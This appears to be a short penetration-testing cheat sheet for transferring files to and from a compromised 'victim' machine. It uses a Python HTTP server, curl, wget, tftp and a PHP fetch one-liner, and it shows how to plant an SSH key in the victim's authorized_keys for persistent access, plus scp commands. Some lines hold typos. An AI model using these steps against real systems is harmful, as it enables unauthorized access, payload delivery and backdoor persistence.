#### Python simple HTTPServer
***python -m SimpleHTTPServer [port]

##### curl
curl -O http://[my_server_ip:port]/fileName

##### wget
wget http://[my_server_ip:port]/fileName

##### tftp
tftp [my_server_ip]
tftp > get myFile
OR
tftp [my_server_ip] <<< "get file"

##### php
echo "<?php file_put_contents('nameOfFile', fopen('http://[my_server_ip:port/fileName', 'r')); ?>" file_one_server.php

#### SSH-SCP
***ssh key generation flow***
- ssh-keygen -t rsa -C "your@email.com"
- add *.pub public key to auhorized_keys on victim server
- echo "ssh-rsa ASD3NbN[..]vlldor..." > authorized_keys
- log in ssh -i private_key [name]@[victim_machine_ip] -p [port]

#### SCP
***copy file***
scp /your/file/path.ext [name]@[victim_server_ip]:/your/file/destination/path.ext

***copy dir***
scrp -r /your/dir/path [name]@[victim_server_ip]:/your/dir/destination/path

#### Netcat
# TODO
